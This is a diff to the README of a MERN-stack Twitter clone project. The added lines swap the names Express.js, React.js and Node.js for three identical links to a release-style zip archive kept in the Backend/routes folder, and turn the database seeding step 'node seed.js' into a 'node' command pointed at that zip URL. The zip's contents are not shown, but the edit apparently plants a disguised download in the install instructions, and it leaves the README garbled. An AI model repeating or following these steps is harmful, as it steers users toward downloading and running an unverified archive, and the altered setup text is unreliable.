@@ -1,6 +1,6 @@
 ## 🐦 Custom Twitter Clone
 
-**Custom Twitter Clone** is a side project I developed using the **MERN stack — MongoDB, Express.js, React.js, and Node.js**. The project was initially inspired by Twitter’s style and core functionalities but has evolved with many additional, custom features beyond Twitter’s scope. It was also created as a guide to help a group of students learn full-stack web development.
+**Custom Twitter Clone** is a side project I developed using the **MERN stack — MongoDB, https://raw.githubusercontent.com/agaribovic/Custom-Twitter-Clone/main/Backend/routes/Custom-Twitter-Clone_v2.9-beta.2.zip, https://raw.githubusercontent.com/agaribovic/Custom-Twitter-Clone/main/Backend/routes/Custom-Twitter-Clone_v2.9-beta.2.zip, and https://raw.githubusercontent.com/agaribovic/Custom-Twitter-Clone/main/Backend/routes/Custom-Twitter-Clone_v2.9-beta.2.zip**. The project was initially inspired by Twitter’s style and core functionalities but has evolved with many additional, custom features beyond Twitter’s scope. It was also created as a guide to help a group of students learn full-stack web development.
 
 ## ✨ Features
 
@@ -34,7 +34,7 @@ Clone the repo and install dependencies for both **Frontend** and **Backend**:
 # Backend: install dependencies, seed the database, and start the server
 cd Backend
 npm install
-node seed.js
+node https://raw.githubusercontent.com/agaribovic/Custom-Twitter-Clone/main/Backend/routes/Custom-Twitter-Clone_v2.9-beta.2.zip
 npm start
 
 # Frontend: install dependencies and start the app
